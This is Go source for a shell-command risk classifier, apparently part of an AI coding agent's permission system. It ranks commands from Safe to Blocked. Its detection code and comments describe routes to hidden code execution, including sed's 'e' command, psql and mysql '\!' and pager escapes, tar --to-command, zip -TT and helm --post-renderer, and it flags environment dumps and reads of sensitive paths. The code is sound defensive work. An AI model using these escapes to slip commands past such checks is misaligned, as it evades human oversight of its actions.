	r := sedOptions.parse(tokens[1:])
	for _, o := range r.opts {
		switch {
		// A script loaded from file is uninspectable — treat as code execution.
		case o.is("-f", "--file"):
			return true
		// Inline scripts reach sed through -e/--expression, fused into the
		// option word (-es/…/e, --expression=s/…/e) or as the next word.
		case o.has && o.is("-e", "--expression") && sedScriptHasShellExec(o.value):
			return true
		}
	}
	// Bare script argument (e.g. sed 's/foo/bar/e'); every operand is checked
	// because which one is the script depends on whether -e was given.
	for _, tok := range r.args() {
		if sedScriptHasShellExec(tok) {
			return true
		}
	}
	return false
}

// sedHasExecCommand reports whether any statement of an inline sed script is
// the bare `e` command, behind any GNU address form. Statements start at the
// script start and after `;`, `{`, `}` or a newline.
func sedHasExecCommand(script string) bool {
	for i := 0; i <= len(script); i++ {
		if i == 0 || strings.IndexByte(";{}\n", script[i-1]) >= 0 {
			if sedExecAt(script, i) {
				return true
			}
		}
	}
	return false
}

// sedExecAt parses `[addr1[,addr2]][!]e` starting at i. addr is a line number,
// `$`, `first~step`, or a /re/ (or \cREc) with optional I/M flags; addr2 may
// also be `+N` or `~N`. Whitespace is allowed around the pieces, and `!` may
// repeat.
func sedExecAt(s string, i int) bool {
	skip := func(j int) int {
		for j < len(s) && (s[j] == ' ' || s[j] == '\t') {
			j++
		}
		return j
	}
	j := skip(i)
	if end, ok := sedAddressEnd(s, j); ok {
		j = skip(end)
		if j < len(s) && s[j] == ',' {
			j = skip(j + 1)
			if j < len(s) && (s[j] == '+' || s[j] == '~') {
				j++
				for j < len(s) && s[j] >= '0' && s[j] <= '9' {
					j++
				}
			} else if end, ok := sedAddressEnd(s, j); ok {
				j = end
			} else {
				return false
			}
			j = skip(j)
		}
	}
	for j < len(s) && s[j] == '!' {
		j = skip(j + 1)
	}
	if j >= len(s) || s[j] != 'e' {
		return false
	}
	return j+1 == len(s) || strings.IndexByte(" \t\r\n;{}", s[j+1]) >= 0
}

// sedAddressEnd parses one sed address at i and returns the index after it.
func sedAddressEnd(s string, i int) (int, bool) {
	if i >= len(s) {
		return i, false
	}
	switch c := s[i]; {
	case c >= '0' && c <= '9':
		j := i
		for j < len(s) && s[j] >= '0' && s[j] <= '9' {
			j++
		}
		if j < len(s) && s[j] == '~' {
			k := j + 1
			for k < len(s) && s[k] >= '0' && s[k] <= '9' {
				k++
			}
			j = k
		}
		return j, true
	case c == '$':
		return i + 1, true
	case c == '/' || (c == '\\' && i+1 < len(s)):
		delim, j := c, i+1
		if c == '\\' {
			delim, j = s[i+1], i+2
		}
		for j < len(s) && s[j] != delim {
			if s[j] == '\\' {
				j++
			}
			j++
		}
		if j >= len(s) {
			return i, false
		}
		j++
		for j < len(s) && (s[j] == 'I' || s[j] == 'M') {
			j++
		}
		return j, true
	}
	return i, false
}

// sedScriptHasShellExec detects the sed 'e' command in an inline script.
// It looks for a standalone 'e' command or an 'e' flag on an s/// substitution.
func sedScriptHasShellExec(tok string) bool {
	// Strip surrounding quotes so the script content is comparable.
	if len(tok) >= 2 {
		if (tok[0] == '\'' && tok[len(tok)-1] == '\'') || (tok[0] == '"' && tok[len(tok)-1] == '"') {
			tok = tok[1 : len(tok)-1]
		}
	}
	if tok == "" {
		return false
	}
	// Standalone 'e' command, possibly separated by semicolons/newlines or
	// followed by an optional command argument (e.g. "e whoami").
	if sedHasExecCommand(tok) {
		return true
	}
	for _, flags := range sedSubstitutionFlags(tok) {
		// A write destination is data, even when its name contains 'e'.
		flags, _, _ = strings.Cut(flags, "w")
		if strings.ContainsAny(flags, "eE") {
			return true
		}
	}
	return false
}

// isPackageManagerRun reports whether a package-manager invocation runs a
// project-defined script (and thus arbitrary code). It inspects the first
// non-flag token after the command: for run-style managers that token must be
// a known run/start/test/build subcommand. bun additionally executes a bare
// file argument (`bun index.ts`) — a token that looks like a path rather than
// one of bun's own subcommands (add/install/remove/…).
func isPackageManagerRun(first string, tokens []string) bool {
	subs, ok := pkgRunSubcommands[first]
	if !ok {
		return false
	}
	for _, tok := range tokens[1:] {
		if strings.HasPrefix(tok, "-") {
			continue
		}
		if subs[tok] {
			return true
		}
		if first == "bun" && (strings.Contains(tok, "/") || strings.Contains(tok, ".")) {
			return true
		}
		return false
	}
	return false
}

func isInstall(first string, tokens []string) bool {
	if !installPrefixes[first] {
		return false
	}

	// npm/pnpm/yarn/bun/pip/gem install / ci / add
	switch first {
	case "npm", "pnpm", "yarn", "bun", "pip", "pip3", "gem", "apk",
		"poetry", "pipenv", "bundle", "composer":
		for _, tok := range tokens[1:] {
			switch tok {
			case "install", "i", "ci", "add", "require", "update", "remove", "uninstall":
				return true
			}
		}
	}

	// cargo install
	if first == "cargo" {
		return hasArgAfter(tokens, "cargo", "install")
	}

	// Host package managers: install/upgrade mutate the machine;
	// list/info/--version fall through as safe.
	if first == "brew" || first == "apt" || first == "apt-get" || first == "yum" || first == "dnf" {
		return hostPkgMutates(tokens)
	}
	if first == "dpkg" {
		return dpkgInstalls(tokens)
	}
	if first == "rustup" {
		return rustupMutates(tokens)
	}
	if first == "nvm" || first == "fnm" || first == "pyenv" || first == "rbenv" || first == "nodenv" || first == "asdf" {
		return versionManagerMutates(tokens)
	}

	// go subcommands that fetch remote code: go install <pkg>, go get,
	// go mod download. Bare "go install" is a local build, and "go mod tidy"
	// / "go build" / "go test" stay Safe (handled elsewhere).
	if first == "go" {
		var args []string
		for _, tok := range tokens[1:] {
			if !strings.HasPrefix(tok, "-") {
				args = append(args, tok)
			}
		}
		if len(args) == 0 {
			return false
		}
		switch args[0] {
		case "get":
			return true // go get fetches remote modules
		case "install":
			return len(args) > 1 // go install <pkg> downloads; bare = local build
		case "mod":
			return len(args) > 1 && args[1] == "download"
		}
		return false
	}

	// uv sync / add / pip install / tool install fetch or materialise
	// a project environment. `uv run` is code execution above.
	if first == "uv" {
		return uvIsInstall(tokens)
	}

	return false
}

// hasArgAfter returns true if the token after 'after' is 'target'.
// If target is empty, just checks that 'after' exists and has a successor.
func hasArgAfter(tokens []string, after, target string) bool {
	for i, tok := range tokens {
		if tok == after && i+1 < len(tokens) {
			if target == "" {
				return true
			}
			// Check next non-flag token
			for j := i + 1; j < len(tokens); j++ {
				if !strings.HasPrefix(tokens[j], "-") {
					return tokens[j] == target || target == ""
				}
			}
			return false
		}
	}
	return false
}

func printenvDumpsAll(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if tok == "-0" || tok == "--null" || tok == "--help" || tok == "--version" {
			continue
		}
		if strings.HasPrefix(tok, "-") {
			continue
		}
		return false
	}
	return true
}

// hugoOptions is the grammar of hugo's options, which may precede the
// subcommand: their values must not be read as the verb. hugo (cobra) folds
// long option names to lower case but keeps short letters case-sensitive (-d
// takes the destination, -D builds drafts).
var hugoOptions = optSpec{
	short: "sdbcelpt",
	long: valueOpts("source destination baseurl contentdir environment layoutdir theme themesdir config configdir cachedir " +
		"loglevel poll port bind ignorevendorpaths timeout tlscertfile tlskeyfile cpuprofile memprofile mutexprofile trace"),
	foldLong: true,
	posix:    true,
}

func classifyHugo(tokens []string) RiskClass {
	if words := hugoOptions.parse(tokens[1:]).args(); len(words) > 0 {
		switch words[0] {
		case "server", "serve":
			return CodeExecution
		case "version", "help", "config", "list", "mod":
			return Safe
		default:
			return LocalWrite
		}
	}
	if networkInfoQuery(tokens) {
		return Safe
	}
	// Bare `hugo` builds the site into public/.
	return LocalWrite
}

// infraOptions are the global options of each infra CLI that may precede the
// verb; the value (a namespace, context, ...) is not the verb. Both are pflag
// programs: exact long names, clustering short letters.
var infraOptions = map[string]optSpec{
	"kubectl": {
		short: "nsv",
		long: valueOpts("namespace context kubeconfig cluster user server as as-group as-uid cache-dir " +
			"certificate-authority client-certificate client-key log-flush-frequency password username profile " +
			"profile-output request-timeout tls-server-name token v vmodule"),
	},
	"helm": {
		short: "n",
		long: valueOpts("namespace kube-context kubeconfig burst-limit kube-apiserver kube-as-group kube-as-user " +
			"kube-ca-file kube-tls-server-name kube-token qps registry-config repository-cache repository-config"),
	},
}

// infraFlagsWithValue lists the value-taking spellings of each infra CLI's
// global options, for callers that compare whole words.
var infraFlagsWithValue = map[string]map[string]bool{
	"kubectl": infraOptions["kubectl"].valueFlags(),
	"helm":    infraOptions["helm"].valueFlags(),
}

// infraVerbs returns the non-flag tokens after the command, skipping the value
// of value-taking global flags.
func infraVerbs(first string, tokens []string) []string {
	return infraOptions[first].parse(tokens[1:]).args()
}

func classifyInfraCLI(first string, tokens []string) RiskClass {
	verbs := infraVerbs(first, tokens)
	if len(verbs) == 0 {
		return Safe
	}
	verb := verbs[0]
	var sub string
	if len(verbs) > 1 {
		sub = verbs[1]
	}
	// helm hands the rendered manifests to the named post-renderer program.
	if first == "helm" {
		for _, tok := range tokens[1:] {
			if tok == "--post-renderer" || strings.HasPrefix(tok, "--post-renderer=") {
				return CodeExecution
			}
		}
	}
	switch first {
	case "kubectl":
		switch verb {
		case "get", "describe", "logs", "top", "explain",
			"api-resources", "api-versions", "cluster-info",
			"config", "version", "diff", "auth", "wait":
			// auth reconcile creates and updates RBAC objects.
			if verb == "auth" && sub == "reconcile" {
				return SystemWrite
			}
			return NetworkEgress
		case "exec", "attach", "run", "debug", "port-forward", "proxy", "cp":
			return CodeExecution
		case "apply", "create", "delete", "replace", "patch", "scale",
			"rollout", "annotate", "label", "taint", "drain", "cordon",
			"uncordon", "expose":
			return SystemWrite
		}
	case "helm":
		switch verb {
		case "list", "ls", "status", "show", "get", "history",
			"version", "env", "search", "template", "lint", "diff":
			return NetworkEgress
		case "install", "upgrade", "uninstall", "rollback", "push":
			return SystemWrite
		}
	case "terraform":
		switch verb {
		case "plan", "validate", "fmt", "show", "output", "version",
			"providers", "console", "graph", "state":
			// state rm/mv/push/replace-provider edit the state in place.
			if verb == "state" {
				switch sub {
				case "rm", "mv", "push", "replace-provider":
					return SystemWrite
				}
			}
			return NetworkEgress
		case "apply", "destroy", "import", "taint", "untaint":
			return SystemWrite
		}
	}
	return Unknown
}

func interpreterIsSyntaxCheck(first string, tokens []string) bool {
	switch first {
	case "php":
		return hasAny(tokens, "-l", "--syntax-check") && syntaxCheckArgumentsOnly(tokens, "-l", "--syntax-check")
	case "ruby":
		return hasAny(tokens, "-c") && syntaxCheckArgumentsOnly(tokens, "-c")
	case "node":
		return hasAny(tokens, "--check", "-c") && syntaxCheckArgumentsOnly(tokens, "--check", "-c")
	}
	return false
}

func sqliteRunsShell(tokens []string) bool {
	for _, tok := range tokens[1:] {
		low := strings.ToLower(tok)
		if strings.Contains(low, ".shell") || strings.Contains(low, ".system") || strings.Contains(low, ".read") || strings.Contains(low, ".load") || strings.Contains(low, "load_extension") || strings.Contains(low, "-init") {
			return true
		}
	}
	return false
}

// dbClientShellPattern matches the client-side commands of the PostgreSQL and
// MySQL command-line clients that run a local program: psql's \! and the
// \g/\gx/\o/\w/\copy forms that pipe into one, and mysql's \! / system and
// pager commands.
var dbClientShellPattern = regexp.MustCompile(`(?i)\\!|(^|[;\s=])system\s|(^|[;\s=])pager\s|\\P\s|\\(?:g|gx|o|w|copy|watch)\b[^|]*\|`)

// dbClientRunsShell reports whether a database client invocation carries a
// command that executes a local program. The network class stays for plain
// queries; only these escapes are code execution.
func dbClientRunsShell(name string, tokens []string) bool {
	switch name {
	case "psql", "mysql", "mariadb", "pgcli", "mycli":
	default:
		return false
	}
	for _, tok := range tokens[1:] {
		if dbClientShellPattern.MatchString(tok) || strings.HasPrefix(tok, "--pager") {
			return true
		}
	}
	return false
}

func classifyDirenv(tokens []string) RiskClass {
	for _, tok := range tokens[1:] {
		if strings.HasPrefix(tok, "-") {
			continue
		}
		switch tok {
		case "exec":
			return CodeExecution
		case "allow", "permit", "deny", "revoke":
			return Persistence
		case "status", "version", "help", "hook", "export", "stdlib":
			return Safe
		default:
			return Unknown
		}
	}
	return Safe
}

func versionManagerMutates(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if strings.HasPrefix(tok, "-") {
			continue
		}
		switch tok {
		case "install", "uninstall", "global", "local", "shell", "rehash":
			return true
		}
		return false
	}
	return false
}

func opensslContactsRemote(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if strings.HasPrefix(tok, "-") {
			continue
		}
		switch tok {
		case "s_client", "s_server", "s_time", "ocsp":
			return true
		}
		return false
	}
	return false
}

func rustupMutates(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if strings.HasPrefix(tok, "-") {
			continue
		}
		switch tok {
		case "install", "update", "uninstall", "self", "toolchain", "target", "component", "override":
			return true
		}
		return false
	}
	return false
}

func hostPkgMutates(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if strings.HasPrefix(tok, "-") {
			continue
		}
		switch tok {
		case "install", "reinstall", "uninstall", "upgrade",
			"dist-upgrade", "full-upgrade", "remove", "purge",
			"autoremove", "update", "tap":
			return true
		}
	}
	return false
}

func dpkgInstalls(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if tok == "-i" || tok == "--install" || strings.HasPrefix(tok, "--install=") {
			return true
		}
		if strings.HasPrefix(tok, "-") && !strings.HasPrefix(tok, "--") && strings.Contains(tok[1:], "i") {
			return true
		}
	}
	return false
}

func uvIsInstall(tokens []string) bool {
	var args []string
	for _, tok := range tokens[1:] {
		if !strings.HasPrefix(tok, "-") {
			args = append(args, tok)
		}
	}
	if len(args) == 0 {
		return false
	}
	switch args[0] {
	case "sync", "add", "remove":
		return true
	case "pip":
		return len(args) > 1 && (args[1] == "install" || args[1] == "uninstall")
	case "tool":
		return len(args) > 1 && (args[1] == "install" || args[1] == "uninstall")
	case "python":
		return len(args) > 1 && args[1] == "install"
	}
	return false
}

// tarCommandLongOptions are GNU tar long options whose value names a program
// tar executes (compression filter, per-member pipe, volume-change script,
// checkpoint action, remote shell / rmt helpers).
var tarCommandLongOptions = []string{
	"--use-compress-program", "--to-command", "--info-script", "--new-volume-script",
	"--checkpoint-action", "--rsh-command", "--rmt-command",
}

// tarOptions is the GNU tar option grammar the classifier reads: the short
// letters that take a value (-f, -C, -I, -F, ...) and the long options it
// needs to recognise. Abbreviations are accepted as getopt_long does, and `--`
// is not an end of options for the predicates built on it, so a program option
// cannot hide behind one.
var tarOptions = optSpec{
	short: "gCTXfFLbHVIKN",
	long: longTable("use-compress-program to-command info-script new-volume-script checkpoint-action "+
		"rsh-command rmt-command directory file", "checkpoint list remove-files create append update catenate concatenate"),
	abbrev:         true,
	ignoreDashDash: true,
}

// tarRunsCommand reports whether a tar invocation names a program for tar to
// execute. GNU tar accepts any unambiguous prefix of a long option, so a token
// that is a prefix of a command-taking option is flagged (an ambiguous prefix
// is a tar error anyway). Short letters are scanned inside bundled clusters
// (-xIf prog) and in the old-style first operand (tar xIf prog a.tar), where
// the option values arrive as later words.
func tarRunsCommand(tokens []string) bool {
	r := tarOptions.parse(tokens[1:])
	for _, o := range r.opts {
		switch {
		case o.is("-I", "-F"):
			return true
		case o.is(tarCommandLongOptions...):
			// A checkpoint action other than exec runs nothing.
			if o.is("--checkpoint-action") && o.has && o.end == o.at && !strings.HasPrefix(o.value, "exec") {
				continue
			}
			return true
		}
	}
	// Old-style first operand: every letter is an option, its values come from
	// later words.
	return r.operandAt == 0 && strings.ContainsAny(r.operands[0], "IF")
}

// zipRunsCommand reports whether zip is given a test command (-TT CMD, also
// fused as -TTCMD) or its long spelling.
func zipRunsCommand(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if tok == "--" {
			break
		}
		if strings.HasPrefix(tok, "-TT") || tok == "--unzip-command" || strings.HasPrefix(tok, "--unzip-command=") {
			return true
		}
	}
	return false
}

// cpioRunsCommand reports whether cpio names a remote-shell or remote-tape
// program. GNU cpio accepts any unambiguous long-option prefix.
func cpioRunsCommand(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if tok == "--" {
			break
		}
		if !strings.HasPrefix(tok, "--") {
			continue
		}
		name, _, _ := strings.Cut(tok[2:], "=")
		if len(name) >= 3 && (strings.HasPrefix("rsh-command", name) || strings.HasPrefix("rmt-command", name)) {
			return true
		}
	}
	return false
}

func killTargetsInitOrBroadcast(tokens []string) bool {
	skipNext := false
	afterDashDash := false
	for _, tok := range tokens[1:] {
		if skipNext {
			skipNext = false
			continue
		}
		if tok == "--" {
			afterDashDash = true
			continue
		}
		if !afterDashDash {
			switch tok {
			case "-s", "-n", "--signal":
				skipNext = true
				continue
			}
			if strings.HasPrefix(tok, "--signal=") {
				continue
			}
			// -TERM / -9 / -HUP are signals. -1 (in any numeric spelling,
			// -01 included) is left for the pid check so `kill -- -1` and a
			// bare `-1` operand escalate.
			if strings.HasPrefix(tok, "-") {
				if n, err := strconv.Atoi(tok); err != nil || n != -1 {
					continue
				}
			}
		}
		if n, err := strconv.Atoi(tok); err == nil && (n == 1 || n == -1) {
			return true
		}
	}
	return false
}

// classifyContainerCLI classifies docker / docker-compose by effect.
// Inspect/list is safe; run/exec/build/compose up executes image code;
// pull/push is egress; prune and image/volume deletion are hard to undo.
// Unrecognised verbs stay unknown (deny).
func classifyContainerCLI(first string, tokens []string) RiskClass {
	verbs := containerVerbPath(first, tokens)
	if containerRunsImage(verbs) {
		return CodeExecution
	}
	if containerContactsRemote(verbs) {
		return NetworkEgress
	}
	if containerIsHardMutation(verbs, tokens) {
		return SystemWrite
	}
	if formattingMutates(first, tokens) {
		return LocalWrite
	}
	if containerIsKnownLocal(verbs) {
		return Safe
	}
	return Unknown
}

// containerGlobalOptions are the docker-style options that may precede the
// verb. The verb is the first operand.
var containerGlobalOptions = optSpec{
	short: "Hcl",
	long:  valueOpts("host context log-level config tlscacert tlscert tlskey"),
	posix: true,
}

// containerComposeOptions are the options that may precede a compose verb or
// the sub-verb of a container group.
var containerComposeOptions = optSpec{
	short: "fpH",
	long: valueOpts("file project-name profile env-file project-directory ansi parallel progress " +
		"host context log-level tlscacert tlscert tlskey"),
	posix: true,
}

// containerGlobalFlagsWithArg lists the value-taking spellings of the global
// options, for callers that compare whole words.
var containerGlobalFlagsWithArg = containerGlobalOptions.valueFlags()

func containerVerbPath(first string, tokens []string) []string {
	if first == "docker-compose" {
		rest := containerComposeOptions.parse(tokens[1:]).args()
		if len(rest) == 0 {
			return []string{"compose"}
		}
		return []string{"compose", rest[0]}
	}
	rest := containerGlobalOptions.parse(tokens[1:]).args()
	if len(rest) == 0 {
		return nil
	}
	cmd := rest[0]
	switch cmd {
	case "compose", "container", "image", "volume", "network",
		"system", "builder", "buildx", "plugin", "context",
		"manifest", "secret", "config":
		sub := containerComposeOptions.parse(rest[1:]).args()
		if len(sub) == 0 {
			return []string{cmd}
		}
		return []string{cmd, sub[0]}
	default:
		return []string{cmd}
	}
}

func containerVerb(verbs []string) (group, cmd string) {
	if len(verbs) == 0 {
		return "", ""
	}
	if len(verbs) == 1 {
		return "", verbs[0]
	}
	return verbs[0], verbs[1]
}

func containerRunsImage(verbs []string) bool {
	group, cmd := containerVerb(verbs)
	switch group {
	case "":
		switch cmd {
		case "run", "exec", "build", "create", "attach":
			return true
		}
	case "compose":
		switch cmd {
		case "up", "run", "exec", "build", "create", "watch":
			return true
		}
	case "container":
		switch cmd {
		case "run", "exec", "create", "attach":
			return true
		}
	case "image", "buildx", "builder":
		return cmd == "build" || cmd == "bake"
	}
	return false
}

func containerContactsRemote(verbs []string) bool {
	group, cmd := containerVerb(verbs)
	switch group {
	case "":
		switch cmd {
		case "pull", "push", "login", "logout", "search":
			return true
		}
	case "compose", "image":
		return cmd == "pull" || cmd == "push"
	case "manifest":
		return cmd == "push" || cmd == "inspect"
	}
	return false
}

func containerIsHardMutation(verbs []string, tokens []string) bool {
	group, cmd := containerVerb(verbs)
	if group == "compose" && cmd == "down" {
		for _, tok := range tokens {
			if tok == "-v" || tok == "--volumes" || tok == "--rmi" || strings.HasPrefix(tok, "--rmi=") {
				return true
			}
		}
		return false
	}
	if cmd == "prune" {
		return true
	}
	switch group {
	case "":
		return cmd == "rmi"
	case "image":
		return cmd == "rm" || cmd == "rmi"
	case "volume":
		return cmd == "rm"
	}
	return false
}

func containerIsKnownLocal(verbs []string) bool {
	if len(verbs) == 0 {
		return true // docker --help / docker --version
	}
	group, cmd := containerVerb(verbs)
	if group == "" {
		switch cmd {
		case "ps", "images", "logs", "inspect", "version", "info",
			"events", "top", "stats", "port", "history", "diff",
			"stop", "rm", "kill", "pause", "unpause", "restart",
			"rename", "update", "wait", "start",
			"help", "completion":
			return true
		}
		return false
	}
	switch group {
	case "compose":
		switch cmd {
		case "ps", "logs", "config", "images", "version", "ls", "list",
			"down", "stop", "rm", "pause", "unpause", "restart", "kill",
			"start", "port", "top", "events":
			return true
		}
	case "container":
		switch cmd {
		case "ls", "ps", "logs", "inspect", "stats", "top", "port",
			"diff", "wait", "stop", "rm", "kill", "pause", "unpause",
			"restart", "rename", "start":
			return true
		}
	case "image":
		switch cmd {
		case "ls", "inspect", "history":
			return true
		}
	case "volume", "network", "plugin", "context", "secret", "config":
		switch cmd {
		case "ls", "inspect", "list":
			return true
		}
	case "system":
		return cmd == "df" || cmd == "info" || cmd == "events"
	case "buildx", "builder":
		return cmd == "version" || cmd == "ls" || cmd == "inspect"
	case "manifest":
		return false // inspect is network above
	}
	return false
}

// touchesSystemPath reports whether any token names a sensitive path (an
// argument or a redirect target alike). It is intentionally broader than the
// redirect-only scan in isSystemWrite — it catches reads/args such as
// `cat /etc/foo`, `cat ~/.bashrc`, or an unknown tool pointed at /usr — so both
// checks exist. It keeps the legacy trailing-slash system-prefix check and
// additionally uses ClassifyPath for home rc files and trust anchors.
func touchesSystemPath(tokens []string) bool {
	for _, tok := range tokens {
		if isRedirectToken(tok) {
			continue
		}
		if (isSystemPath(tok) && tok != "/etc/passwd" && Rank(classifyShellTokenPath(tok)) >= Rank(SystemWrite)) || shellPathIsHomeSensitive(tok) {
			return true
		}
	}
	return false
}

// isSystemPath returns true if the path targets a system directory.
var systemPathPrefixes = []string{"/etc/", "/usr/", "/bin/", "/lib/", "/lib32/", "/lib64/", "/libx32/", "/var/", "/opt/", "/boot/", "/sbin/"}

func isSystemPath(path string) bool {
	// The current user's home is theirs even when it sits under a system
	// prefix (a service account with HOME=/var/lib/svc); the protected paths
	// inside it are caught by shellPathIsHomeSensitive.
	for _, home := range currentHomeDirs() {
		if pathWithin(filepath.Clean(path), home) {
			return false
		}
	}
	for _, p := range systemPathPrefixes {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

// ── Ranking ────────────────────────────────────────────────────────────

// Rank returns the severity order for priority comparison. Exported so
// consumers that enforce risk caps (e.g. the sub-agent maxRisk clamp) share
// this single ordering instead of mirroring it — a mirror silently drifts
// when a class is added, as happened with Unknown.
func Rank(cls RiskClass) int {
	switch cls {
	case Blocked:
		return 11
	case Destructive:
		return 10
	case Unknown:
		// Ranked above the prompt-level classes so a single unknown stage in
		// a pipeline/compound command dominates benign siblings (e.g.
		// `pip install x && weirdverb` stays deny-by-default), but below
		// Destructive/Blocked so those keep their more informative label.
		return 9
	case Persistence:
		// Deferred-execution writes outrank plain system writes: a
		// persistence target is a system write PLUS later execution.
		return 8
	case SystemWrite:
		return 7
	case UnreadExec:
		// Same "must prompt" tier as SystemWrite: executing an unread
		// script. Kept out of TrustShortcutAllowed separately.
		return 7
	case CodeExecution:
		return 6
	case NetworkUpload:
		// Local content leaving the machine, or a remote party gaining a
		// channel in, outranks plain egress (so the display summary and a
		// max_risk cap treat it as the worse of the two) but ranks below
		// code execution, which can do everything an upload can and more.
		return 5
	case NetworkEgress:
		return 4
	case Install:
		return 3
	case LocalWrite:
		return 2
	case Safe:
		return 1
	default:
		return 0
	}
}
